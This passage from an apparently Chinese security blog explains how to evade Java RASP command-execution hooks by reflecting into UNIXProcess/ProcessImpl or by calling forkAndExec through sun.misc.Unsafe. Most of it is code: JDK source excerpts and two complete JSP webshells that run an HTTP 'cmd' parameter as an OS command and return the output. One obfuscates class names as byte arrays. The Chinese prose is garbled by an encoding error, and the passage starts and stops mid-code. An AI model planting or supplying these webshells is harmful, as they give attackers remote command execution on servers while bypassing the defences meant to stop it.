class="hljs-type">int</span> envc,</span><br><span class="hljs-params">                                   <span class="hljs-type">byte</span>[] dir,</span><br><span class="hljs-params">                                   <span class="hljs-type">int</span>[] fds,</span><br><span class="hljs-params">                                   <span class="hljs-type">boolean</span> redirectErrorStream)</span><br>        <span class="hljs-keyword">throws</span> IOException;<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨è¿™ä¸ªç»•è¿‡RASPé˜²å¾¡çš„åŸç†å°±æ˜¯ä»–ä»¬é˜²å¾¡çš„å±‚æ•°ä¸å¤Ÿæ·±ï¼Œæ¯”å¦‚åªåˆ°<code>ProcessBuilder.start()</code>æ–¹æ³•ï¼Œè€Œæˆ‘ä»¬åªéœ€è¦ç›´æ¥è°ƒç”¨æœ€ç»ˆæ‰§è¡Œçš„<code>UNIXProcess/ProcessImpl</code>å®ç°å‘½ä»¤æ‰§è¡Œæˆ–è€…ç›´æ¥åå°„<code>UNIXProcess/ProcessImpl</code>çš„<code>forkAndExec</code>æ–¹æ³•å°±å¯ä»¥ç»•è¿‡RASPå®ç°å‘½ä»¤æ‰§è¡Œäº†ã€‚</p><p>è¿™æ˜¯ProcessImplå®ä¾‹åŒ–UNIXProcessçš„æºç ï¼Œä¸»è¦æ˜¯çœ‹çœ‹å‚æ•°ä¼ é€’</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProcessImpl</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> sun.misc.<span class="hljs-type">JavaIOFileDescriptorAccess</span> <span class="hljs-variable">fdAccess</span><br>        <span class="hljs-operator">=</span> sun.misc.SharedSecrets.getJavaIOFileDescriptorAccess();<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">ProcessImpl</span><span class="hljs-params">()</span> &#123;&#125;    <span class="hljs-comment">// Not instantiable</span><br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] toCString(String s) &#123;<br>        <span class="hljs-keyword">if</span> (s == <span class="hljs-literal">null</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">byte</span>[] bytes = s.getBytes();<br>        <span class="hljs-type">byte</span>[] result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[bytes.length + <span class="hljs-number">1</span>];<br>        System.arraycopy(bytes, <span class="hljs-number">0</span>,<br>                         result, <span class="hljs-number">0</span>,<br>                         bytes.length);<br>        result[result.length-<span class="hljs-number">1</span>] = (<span class="hljs-type">byte</span>)<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>    <span class="hljs-keyword">static</span> Process <span class="hljs-title function_">start</span><span class="hljs-params">(String[] cmdarray,</span><br><span class="hljs-params">                         java.util.Map&lt;String,String&gt; environment,</span><br><span class="hljs-params">                         String dir,</span><br><span class="hljs-params">                         ProcessBuilder.Redirect[] redirects,</span><br><span class="hljs-params">                         <span class="hljs-type">boolean</span> redirectErrorStream)</span><br>        <span class="hljs-keyword">throws</span> IOException<br>    &#123;<br>        <span class="hljs-keyword">assert</span> cmdarray != <span class="hljs-literal">null</span> &amp;&amp; cmdarray.length &gt; <span class="hljs-number">0</span>;<br>        <span class="hljs-type">byte</span>[][] args = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[cmdarray.length-<span class="hljs-number">1</span>][];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> args.length; <span class="hljs-comment">// For added NUL bytes</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; args.length; i++) &#123;<br>            args[i] = cmdarray[i+<span class="hljs-number">1</span>].getBytes();<br>            size += args[i].length;<br>        &#125;<br>        <span class="hljs-type">byte</span>[] argBlock = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[size];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">byte</span>[] arg : args) &#123;<br>            System.arraycopy(arg, <span class="hljs-number">0</span>, argBlock, i, arg.length);<br>            i += arg.length + <span class="hljs-number">1</span>;<br>        &#125;<br><br>        <span class="hljs-type">int</span>[] envc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">1</span>];<br>        <span class="hljs-type">byte</span>[] envBlock = ProcessEnvironment.toEnvironmentBlock(environment, envc);<br><br>        <span class="hljs-type">int</span>[] std_fds;<br><br>        <span class="hljs-type">FileInputStream</span>  <span class="hljs-variable">f0</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">f1</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">f2</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (redirects == <span class="hljs-literal">null</span>) &#123;<br>                std_fds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[] &#123; -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span> &#125;;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                std_fds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">3</span>];<br>                <span class="hljs-keyword">if</span> (redirects[<span class="hljs-number">1</span>] == Redirect.PIPE)<br>                    std_fds[<span class="hljs-number">1</span>] = -<span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (redirects[<span class="hljs-number">1</span>] == Redirect.INHERIT)<br>                    std_fds[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">else</span> &#123;<br>                    f1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(redirects[<span class="hljs-number">1</span>].file(),<br>                                              redirects[<span class="hljs-number">1</span>].append());<br>                    std_fds[<span class="hljs-number">1</span>] = fdAccess.get(f1.getFD());<br>                &#125;<br>                <span class="hljs-keyword">if</span> (redirects[<span class="hljs-number">2</span>] == Redirect.PIPE)<br>                    std_fds[<span class="hljs-number">2</span>] = -<span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (redirects[<span class="hljs-number">2</span>] == Redirect.INHERIT)<br>                    std_fds[<span class="hljs-number">2</span>] = <span class="hljs-number">2</span>;<br>                <span class="hljs-keyword">else</span> &#123;<br>                    f2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(redirects[<span class="hljs-number">2</span>].file(),<br>                                              redirects[<span class="hljs-number">2</span>].append());<br>                    std_fds[<span class="hljs-number">2</span>] = fdAccess.get(f2.getFD());<br>                &#125;<br>            &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UNIXProcess</span><br>            (toCString(cmdarray[<span class="hljs-number">0</span>]),<br>             argBlock, args.length,<br>             envBlock, envc[<span class="hljs-number">0</span>],<br>             toCString(dir),<br>                 std_fds,<br>             redirectErrorStream);<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br><br>            <span class="hljs-keyword">try</span> &#123; <span class="hljs-keyword">if</span> (f0 != <span class="hljs-literal">null</span>) f0.close(); &#125;<br>            <span class="hljs-keyword">finally</span> &#123;<br>                <span class="hljs-keyword">try</span> &#123; <span class="hljs-keyword">if</span> (f1 != <span class="hljs-literal">null</span>) f1.close(); &#125;<br>                <span class="hljs-keyword">finally</span> &#123; <span class="hljs-keyword">if</span> (f2 != <span class="hljs-literal">null</span>) f2.close(); &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>UNIXProcessæ¥æ”¶ 8ä¸ªå‚æ•°ï¼Œå…¶ä¸­envcæ˜¯[1]ä¸std_fdséƒ½æ˜¯æ’ä¸º-1çš„æ•°ç»„ï¼ŒredirectErrorStreamä¸å½±å“å¯ä¸ºfalseï¼Œargs.length ä¸º cmd.length - 1ï¼ŒargBlockçš„å†…å®¹å°±æ˜¯æ‰§è¡Œçš„å‘½ä»¤å†…å®¹ã€‚</p></blockquote><p>ä¸€ä¸ªjspçš„payload</p><figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.*&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Method&quot;</span> %&gt;<br>&lt;%!<br>    <span class="hljs-type">byte</span>[] toCString(String s) &#123;<br>        <span class="hljs-keyword">if</span> (s == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-type">byte</span>[] bytes  = s.getBytes();<br>        <span class="hljs-type">byte</span>[] result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[bytes.length + <span class="hljs-number">1</span>];<br>        System.arraycopy(bytes, <span class="hljs-number">0</span>, result, <span class="hljs-number">0</span>, bytes.length);<br>        result[result.length - <span class="hljs-number">1</span>] = (<span class="hljs-type">byte</span>) <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>    InputStream <span class="hljs-title function_">start</span><span class="hljs-params">(String[] strs)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// java.lang.UNIXProcess</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">unixClass</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">46</span>, <span class="hljs-number">108</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">46</span>, <span class="hljs-number">85</span>, <span class="hljs-number">78</span>, <span class="hljs-number">73</span>, <span class="hljs-number">88</span>, <span class="hljs-number">80</span>, <span class="hljs-number">114</span>, <span class="hljs-number">111</span>, <span class="hljs-number">99</span>, <span class="hljs-number">101</span>, <span class="hljs-number">115</span>, <span class="hljs-number">115</span>&#125;);<br>        <span class="hljs-comment">// java.lang.ProcessImpl</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">processClass</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">46</span>, <span class="hljs-number">108</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">46</span>, <span class="hljs-number">80</span>, <span class="hljs-number">114</span>, <span class="hljs-number">111</span>, <span class="hljs-number">99</span>, <span class="hljs-number">101</span>, <span class="hljs-number">115</span>, <span class="hljs-number">115</span>, <span class="hljs-number">73</span>, <span class="hljs-number">109</span>, <span class="hljs-number">112</span>, <span class="hljs-number">108</span>&#125;);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-comment">// åå°„åˆ›å»ºUNIXProcessæˆ–è€…ProcessImpl</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            clazz = Class.forName(unixClass);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            clazz = Class.forName(processClass);<br>        &#125;<br>        <span class="hljs-comment">// è·å–UNIXProcessæˆ–è€…ProcessImplçš„æ„é€ æ–¹æ³•</span><br>        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">assert</span> strs != <span class="hljs-literal">null</span> &amp;&amp; strs.length &gt; <span class="hljs-number">0</span>;<br>        <span class="hljs-comment">// Convert arguments to a contiguous block; it&#x27;s easier to do</span><br>        <span class="hljs-comment">// memory management in Java than in C.</span><br>        <span class="hljs-type">byte</span>[][] args = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[strs.length - <span class="hljs-number">1</span>][];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> args.length; <span class="hljs-comment">// For added NUL bytes</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; args.length; i++) &#123;<br>            args[i] = strs[i + <span class="hljs-number">1</span>].getBytes();<br>            size += args[i].length;<br>        &#125;<br>        <span class="hljs-type">byte</span>[] argBlock = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[size];<br>        <span class="hljs-type">int</span>    <span class="hljs-variable">i</span>        <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">byte</span>[] arg : args) &#123;<br>            System.arraycopy(arg, <span class="hljs-number">0</span>, argBlock, i, arg.length);<br>            i += arg.length + <span class="hljs-number">1</span>;<br>            <span class="hljs-comment">// No need to write NUL bytes explicitly</span><br>        &#125;<br>        <span class="hljs-type">int</span>[] envc    = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">1</span>];<br>        <span class="hljs-type">int</span>[] std_fds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>&#125;;<br>        <span class="hljs-type">FileInputStream</span>  <span class="hljs-variable">f0</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">f1</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">f2</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-comment">// In theory, close() can throw IOException</span><br>        <span class="hljs-comment">// (although it is rather unlikely to happen here)</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (f0 != <span class="hljs-literal">null</span>) f0.close();<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">if</span> (f1 != <span class="hljs-literal">null</span>) f1.close();<br>            &#125; <span class="hljs-keyword">finally</span> &#123;<br>                <span class="hljs-keyword">if</span> (f2 != <span class="hljs-literal">null</span>) f2.close();<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">// åˆ›å»ºUNIXProcessæˆ–è€…ProcessImplå®ä¾‹</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> constructor.newInstance(<br>                toCString(strs[<span class="hljs-number">0</span>]), argBlock, args.length,<br>                <span class="hljs-literal">null</span>, envc[<span class="hljs-number">0</span>], <span class="hljs-literal">null</span>, std_fds, <span class="hljs-literal">false</span><br>        );<br>        <span class="hljs-comment">// è·å–å‘½ä»¤æ‰§è¡Œçš„InputStream</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">inMethod</span> <span class="hljs-operator">=</span> object.getClass().getDeclaredMethod(<span class="hljs-string">&quot;getInputStream&quot;</span>);<br>        inMethod.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">return</span> (InputStream) inMethod.invoke(object);<br>    &#125;<br>    String <span class="hljs-title function_">inputStreamToString</span><span class="hljs-params">(InputStream in, String charset)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (charset == <span class="hljs-literal">null</span>) &#123;<br>                charset = <span class="hljs-string">&quot;UTF-8&quot;</span>;<br>            &#125;<br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">int</span>                   <span class="hljs-variable">a</span>   <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>            <span class="hljs-type">byte</span>[]                b   = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-keyword">while</span> ((a = in.read(b)) != -<span class="hljs-number">1</span>) &#123;<br>                out.write(b, <span class="hljs-number">0</span>, a);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(out.toByteArray());<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> e;<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">if</span> (in != <span class="hljs-literal">null</span>)<br>                in.close();<br>        &#125;<br>    &#125;<br>%&gt;<br>&lt;%<br>    String[] str = request.getParameterValues(<span class="hljs-string">&quot;cmd&quot;</span>);<br>    <span class="hljs-keyword">if</span> (str != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span>     <span class="hljs-operator">=</span> start(str);<br>        <span class="hljs-type">String</span>      <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> inputStreamToString(in, <span class="hljs-string">&quot;UTF-8&quot;</span>);<br>        out.println(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);<br>        out.println(result);<br>        out.println(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>        out.flush();<br>        out.close();<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><h2 id="unsafeforkandexecç»•è¿‡"><a href="#Unsafe-forkAndExecç»•è¿‡" class="headerlink" title="Unsafe+forkAndExecç»•è¿‡"></a>Unsafe+forkAndExecç»•è¿‡</h2><p>é‚£å¦‚æœRASPæŠŠ<code>UNIXProcess/ProcessImpl</code>ç±»çš„æ„é€ æ–¹æ³•ç»™æ‹¦æˆªäº†å‘¢</p><p>é‚£æˆ‘ä»¬å°±éœ€è¦åˆ©ç”¨javaçš„ä¸€äº›ç‰¹æ€§æ¥ç›´æ¥è§¦å‘<code>forkAndExec</code>æ–¹æ³•ä»è€Œç»•è¿‡è¿‡æ»¤</p><p>å…·ä½“çš„æ­¥éª¤å¦‚ä¸‹ï¼š</p><ol><li>ä½¿ç”¨<code>sun.misc.Unsafe.allocateInstance(Class)</code>ç‰¹æ€§å¯ä»¥æ— éœ€<code>new</code>æˆ–è€…<code>newInstance</code>åˆ›å»º<code>UNIXProcess/ProcessImpl</code>ç±»å¯¹è±¡ã€‚</li><li>åå°„<code>UNIXProcess/ProcessImpl</code>ç±»çš„<code>forkAndExec</code>æ–¹æ³•ã€‚</li><li>æ„é€ <code>forkAndExec</code>éœ€è¦çš„å‚æ•°å¹¶è°ƒç”¨ã€‚</li><li>åå°„<code>UNIXProcess/ProcessImpl</code>ç±»çš„<code>initStreams</code>æ–¹æ³•åˆå§‹åŒ–è¾“å…¥è¾“å‡ºç»“æœæµå¯¹è±¡ã€‚</li><li>åå°„<code>UNIXProcess/ProcessImpl</code>ç±»çš„<code>getInputStream</code>æ–¹æ³•è·å–æœ¬åœ°å‘½ä»¤æ‰§è¡Œç»“æœ(å¦‚æœè¦è¾“å‡ºæµã€å¼‚å¸¸æµåå°„å¯¹åº”æ–¹æ³•å³å¯)ã€‚</li></ol><p>å› ä¸ºä¸å¤ªå¥½éªŒè¯ï¼Œç›´æ¥copyä¸€ä¸‹Aiwinå¸ˆå‚…çš„jsp payload</p><figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;sun.misc.Unsafe&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.ByteArrayOutputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Method&quot;</span> %&gt;<br>&lt;%!<br>    <span class="hljs-type">byte</span>[] toCString(String s) &#123;<br>        <span class="hljs-keyword">if</span> (s == <span class="hljs-literal">null</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">byte</span>[] bytes  = s.getBytes();<br>        <span class="hljs-type">byte</span>[] result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[bytes.length + <span class="hljs-number">1</span>];<br>        System.arraycopy(bytes, <span class="hljs-number">0</span>,<br>                result, <span class="hljs-number">0</span>,<br>                bytes.length);<br>        result[result.length - <span class="hljs-number">1</span>] = (<span class="hljs-type">byte</span>) <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>%&gt;<br>&lt;%<br>    String[] strs = request.getParameterValues(<span class="hljs-string">&quot;cmd&quot;</span>);<br>    <span class="hljs-keyword">if</span> (strs != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">theUnsafeField</span> <span class="hljs-operator">=</span> Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        theUnsafeField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> (Unsafe) theUnsafeField.get(<span class="hljs-literal">null</span>); <span class="hljs-comment">//é€šè¿‡getæ–¹æ³•å¾—åˆ°unsafeå¯¹è±¡</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">processClass</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            processClass = Class.forName(<span class="hljs-string">&quot;java.lang.UNIXProcess&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            processClass = Class.forName(<span class="hljs-string">&quot;java.lang.ProcessImpl&quot;</span>);<br>        &#125;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">processObject</span> <span class="hljs-operator">=</span> unsafe.allocateInstance(processClass);<span class="hljs-comment">//åˆ›å»ºUNIXProcesså¯¹è±¡</span><br>        <span class="hljs-comment">//åŸä»£ç </span><br>        <span class="hljs-type">byte</span>[][] args = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[strs.length - <span class="hljs-number">1</span>][];<br>        <span class="hljs-type">int</span>      <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> args.length; <br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; args.length; i++) &#123;<br>            args[i] = strs[i + <span class="hljs-number">1</span>].getBytes();<br>            size += args[i].length;<br>        &#125;<br>        <span class="hljs-type">byte</span>[] argBlock = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[size];<br>        <span class="hljs-type">int</span>    <span class="hljs-variable">i</span>        <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">byte</span>[] arg : args) &#123;<br>            System.arraycopy(arg, <span class="hljs-number">0</span>, argBlock, i, arg.length);<br>            i += arg.length + <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-type">int</span>[] envc                 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">1</span>];<br>        <span class="hljs-type">int</span>[] std_fds              = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>&#125;;<br>        <span class="hljs-comment">//æ„é€ forkAndExecéœ€è¦çš„å‚æ•°</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">launchMechanismField</span> <span class="hljs-operator">=</span> processClass.getDeclaredField(<span class="hljs-string">&quot;launchMechanism&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">helperpathField</span>      <span class="hljs-operator">=</span> processClass.getDeclaredField(<span class="hljs-string">&quot;helperpath&quot;</span>);<br>        launchMechanismField.setAccessible(<span class="hljs-literal">true</span>);<br>        helperpathField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//ä»UNIXProcessä¸­å¾—åˆ°launchMechanismå’ŒHelperpath</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">launchMechanismObject</span> <span class="hljs-operator">=</span> launchMechanismField.get(processObject);<br>        <span class="hljs-type">byte</span>[] helperpathObject      = (<span class="hljs-type">byte</span>[]) helperpathField.get(processObject);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">ordinal</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>) launchMechanismObject.getClass().getMethod(<span class="hljs-string">&quot;ordinal&quot;</span>).invoke(launchMechanismObject);<br>       <span class="hljs-comment">//åå°„forkAndExecæ–¹æ³•</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">forkMethod</span> <span class="hljs-operator">=</span> processClass.getDeclaredMethod(<span class="hljs-string">&quot;forkAndExec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;<br>                <span class="hljs-type">int</span>.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class,<br>                <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>[].class, <span class="hljs-type">boolean</span>.class<br>        &#125;);<br>        forkMethod.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">pid</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>) forkMethod.invoke(processObject, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<br>                ordinal + <span class="hljs-number">1</span>, helperpathObject, toCString(strs[<span class="hljs-number">0</span>]), argBlock, args.length,<br>                <span class="hljs-literal">null</span>, envc[<span class="hljs-number">0</span>], <span class="hljs-literal">null</span>, std_fds, <span class="hljs-literal">false</span><br>        &#125;);<br>        <span class="hljs-comment">// åˆå§‹åŒ–å‘½ä»¤æ‰§è¡Œç»“æœï¼Œå°†æœ¬åœ°å‘½ä»¤æ‰§è¡Œçš„è¾“å‡ºæµè½¬æ¢ä¸ºç¨‹åºæ‰§è¡Œç»“æœçš„è¾“å‡ºæµ</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">initStreamsMethod</span> <span class="hljs-operator">=</span> processClass.getDeclaredMethod(<span class="hljs-string">&quot;initStreams&quot;</span>, <span class="hljs-type">int</span>[].class);<br>        initStreamsMethod.setAccessible(<span class="hljs-literal">true</span>);<br>        initStreamsMethod.invoke(processObject, std_fds);<br>        <span class="hljs-comment">//è·å–è¾“å‡ºå†…å®¹</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getInputStreamMethod</span> <span class="hljs-operator">=</span> processClass.getMethod(<span class="hljs-string">&quot;getInputStream&quot;</span>);<br>        getInputStreamMethod.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> (InputStream) getInputStreamMethod.invoke(processObject);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">int</span>                   <span class="hljs-variable">a</span>    <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-type">byte</span>[]                b    = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-keyword">while</span> ((a = in.read(b)) != -<span class="hljs-number">1</span>) &#123;<br>            baos.write(b, <span class="hljs-number">0</span>, a);<br>        &#125;<br>        out.println(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);<br>        out.println(baos.toString());<br>        out.println(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>        out.flush();<br>     